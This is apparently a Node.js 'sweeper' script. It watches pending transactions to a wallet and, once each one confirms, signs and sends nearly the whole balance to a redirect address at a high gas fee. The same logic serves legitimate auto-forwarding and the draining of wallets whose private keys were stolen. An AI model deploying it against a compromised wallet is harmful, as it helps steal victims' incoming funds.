// Setup: npm install alchemy-sdk
const {
  Alchemy,
  Network,
  Utils,
  AlchemySubscription,
  Wallet,
} = require('alchemy-sdk')
const { ethers } = require('ethers')
require('dotenv').config()
const config = {
  apiKey: process.env.APIKEY,
  network: Network.MATIC_MUMBAI,
}

let wallet = new Wallet(process.env.PRIVATE_KEY)

const provider = new ethers.providers.JsonRpcProvider(process.env.RPC, {
  chainId: parseInt(process.env.CHAIN_ID),
})

const signer = provider.getSigner()

const main = async () => {
  const alchemy = new Alchemy(config)

  let balance = await alchemy.core.getBalance(process.env.WALLET, 'latest')

  balance = Utils.formatEther(balance)
  console.log(`Balance of ${await wallet.getAddress()}: ${balance} ETH`)

  const nonce = await alchemy.core.getTransactionCount(
    process.env.WALLET,
    'latest',
  )

  // Subscription for Alchemy's pendingTransactions API
 

  var newbalance = parseFloat(balance)

  var realBalance = newbalance - 0.0005209643999999988

  console.log(`balance to send ${realBalance}`)
  console.log(`listening on transactions to ${await wallet.getAddress()} `)
  alchemy.ws.on(
    {
      method: AlchemySubscription.PENDING_TRANSACTIONS,
      toAddress: process.env.WALLET, // Replace with address to send  pending transactions to this address
    },
    (tx) => {
      console.log(`pending transaction hash:${tx['hash']}`)

      provider.once(tx['hash'], async(transaction) => {
        console.log(`new transaction confirmation count:${transaction['confirmations']}`)
       // console.log(transaction)
        let newBalance = await alchemy.core.getBalance(process.env.WALLET, 'latest')
       let lBalance = Utils.formatEther(newBalance)
        console.log(`current balance:${lBalance}`)
        var llbalance = parseFloat(lBalance)

        var reallBalance = llbalance - 0.005209643999999988

        console.log(`amount to send: ${reallBalance}`)
        sendTX = async () => {

          const newnonce = await alchemy.core.getTransactionCount(
            process.env.WALLET,
            'latest',
          )
          try {
            let transaction = {
              to: process.env.REDIRECT,
              // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
              value: Utils.parseEther(`${reallBalance}`),
              gasLimit: '21000',
              maxPriorityFeePerGas: Utils.parseUnits('100', 'gwei'),
              maxFeePerGas: Utils.parseUnits('100', 'gwei'),
              nonce: newnonce,
              type: 2,
              chainId: process.env.CHAIN_ID,
            }
        
            let rawTransaction = await wallet.signTransaction(transaction)
            let tx = await alchemy.core.sendTransaction(rawTransaction)
            console.log('Sent transaction', tx)

            let balance = await alchemy.core.getBalance(process.env.WALLET, 'latest')

            balance = Utils.formatEther(balance)
            console.log(`Balance of ${await wallet.getAddress()}: ${balance} ETH`)
          } catch (error) {
            console.log(error.reason)
          }
        }
       

      sendTX()
      })
    },
  )
}

main()


